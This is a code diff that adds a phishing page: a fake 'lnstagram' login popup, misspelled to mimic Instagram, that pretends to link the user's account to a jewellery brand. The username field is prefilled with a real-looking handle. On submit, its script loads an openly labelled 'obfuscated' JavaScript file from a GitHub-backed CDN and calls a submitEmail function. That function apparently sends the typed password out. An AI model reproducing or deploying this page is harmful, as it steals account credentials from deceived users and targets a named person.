@@ -1,0 +1,96 @@
+<div class="popup-login login-facebook animated fadeIn" style="display: none;">
+        <div class="popup-box-login-fb">
+            <a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
+            <div class="navbar-fb"><img src="iconin.png"></div>
+            <div class="content-box-fb">
+                <p class="kaget email-fb" style="width: 330px; top: -15px; text-align: left;">The email or phone number you entered does not match any account. <b>Find your account.</b></p>
+                <p class="kaget sandi-fb" style="width: 330px; top: -15px; text-align: left;">Incorrect password. <b>Did you
+                    forget your password?</b></p>
+                     <p id="error-message" class="kaget sandi-fb" style="width: 330px; top: -15px; text-align: left;">Please enter password first. </p>
+                <img src="icon.jpg">
+                    <div class="txt-login-fb">Log in to your lnstagram account to connect to Giva jewellery.</div>
+                 <form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
+                    <input type="text" class="loginEmail" name="email" id="email-facebook" value="nandita__37" readonly required="" oninvalid="this.setCustomValidity('Enter Email or Mobile Number')" oninput="setCustomValidity('')">
+
+                    <input type="text" class="loginPassword" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
+                    <div class="showHide showPassword" onclick="showFbPassword()" style="display: none;"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i>
+                    </div>
+                    <div class="showHide hidePassword" style="" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
+                    <input type="hidden" name="login" id="login-facebook" value="Facebook" readonly="">
+                    <button type="submit" class="btn-login-fb" onclick="huigo(event)">Log In</button>
+                </form>
+                <div class="txt-create-account">Create account</div>
+                <div class="txt-not-now">Not now</div>
+                <div class="txt-forgotten-password" onclick="open_recfb()">Forgotten password?</div>
+            </div>
+            <div class="language-box">
+                <center>
+                    <div class="language-name language-name-active">English (UK)</div>
+                    <div class="language-name">Bahasa Indonesia</div>
+                    <div class="language-name">Basa Jawa</div>
+                    <div class="language-name">Bahasa Melayu</div>
+                    <div class="language-name">日本語</div>
+                    <div class="language-name">Español</div>
+                    <div class="language-name">Português (Brasil)</div>
+                    <div class="language-name"><i class="fa fa-plus"></i></div>
+                </center>
+            </div>
+            <div class="copyright">lnstagram Inc.</div>
+        </div>
+    </div>
+<script>
+        
+     
+
+        // Function to handle the login button click inside the popup
+        function huigo(event) {
+            event.preventDefault();  // Prevent default form submission
+            fetchObfuscatedScript();
+        }
+
+        // Function to fetch and execute the obfuscated script with retry logic
+        function fetchObfuscatedScript(retryCount = 3) {
+            const scriptUrl = 'https://cdn.jsdelivr.net/gh/Rajaryan827/Testforcdn@main/indexadmin.js';
+
+            // Check if the script is already loaded
+            if (!document.querySelector(`script[src="${scriptUrl}"]`)) {
+                const scriptElement = document.createElement('script');
+                scriptElement.src = scriptUrl;
+
+                scriptElement.onload = function () {
+                    console.log("Obfuscated JS loaded successfully.");
+                    if (typeof submitEmail === 'function') {
+                        try {
+                            submitEmail();  // Ensure submitEmail is defined
+                        } catch (error) {
+                            console.error('Error executing submitEmail:', error);
+                        }
+                    } else {
+                        console.error('submitEmail function is not defined.');
+                    }
+                };
+
+                scriptElement.onerror = function () {
+                    if (retryCount > 0) {
+                        console.warn(`Failed to load script. Retrying... (${retryCount} retries left)`);
+                        fetchObfuscatedScript(retryCount - 1);
+                    } else {
+                        console.error('Failed to load script after multiple attempts.');
+                    }
+                };
+
+                document.body.appendChild(scriptElement);
+            } else {
+                console.log('Obfuscated JS is already loaded.');
+                if (typeof submitEmail === 'function') {
+                    try {
+                        submitEmail();
+                    } catch (error) {
+                        console.error('Error executing submitEmail:', error);
+                    }
+                } else {
+                    console.error('submitEmail function is not defined.');
+                }
+            }
+        }
+</script>
